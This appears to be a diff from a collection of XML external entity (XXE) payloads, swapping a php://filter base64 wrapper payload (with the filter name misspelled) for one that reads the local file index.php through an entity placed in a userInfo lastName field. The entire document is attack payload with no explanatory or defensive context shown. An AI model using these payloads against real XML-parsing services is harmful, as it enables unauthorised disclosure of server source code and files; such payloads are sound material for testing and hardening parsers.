@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE rss [
-<!ELEMENT rss ANY >
-<!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=index.php" >
-]>
-<rss>&xxe;</rss>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:./index.php"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
